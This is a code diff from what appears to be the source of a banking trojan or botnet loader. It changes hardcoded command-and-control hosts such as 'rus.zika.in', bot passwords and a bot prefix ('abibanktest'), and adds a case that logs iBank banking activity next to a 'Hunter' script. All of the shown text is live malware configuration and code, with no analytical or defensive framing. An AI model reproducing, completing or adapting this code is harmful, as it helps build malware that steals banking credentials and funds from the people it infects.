@@ -89,17 +89,12 @@ namespace CONFIGDEBUGSTRINGS
 //	char MainPassword[MAX_PASSWORD_SIZE + 1] = "rGV01X8JFAfjcwTh";
 
 
-//	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "rus.zika.in\0";
-//	char MainPassword[MAX_PASSWORD_SIZE + 1] = "bRS8yYQ0APq9xfzC";
-//	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "rbttest";
-//	char Delay[MAX_DELAY_SIZE + 1]       = "1";
-
-
-
-	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "driver-alaie.com\0";
-	char MainPassword[MAX_PASSWORD_SIZE + 1] = "cbvhX3tJ0k8HwnMy";
-	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "loadertest";
+	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "rus.zika.in\0";
+	char MainPassword[MAX_PASSWORD_SIZE + 1] = "bRS8yYQ0APq9xfzC";
+	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "abibanktest";
 	char Delay[MAX_DELAY_SIZE + 1]       = "1";
+
+
 
 	#ifdef USE_BANKING_HOSTS
 		char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = "rus.zika.in\0";
@@ -337,6 +332,10 @@ string GetPrefix(bool CheckBankingMode)
 
 			#ifdef HunterH
 			case SCRIPT_HUNTER: return (PCHAR)PathHunter;
+			#endif
+
+			#ifdef IBankSystemH
+			case SCRIPT_IBANK_LOG: return (PCHAR)PathIBank;
 			#endif
 
 			case SCRIPT_COMMENT:      return (PCHAR)PathComment;
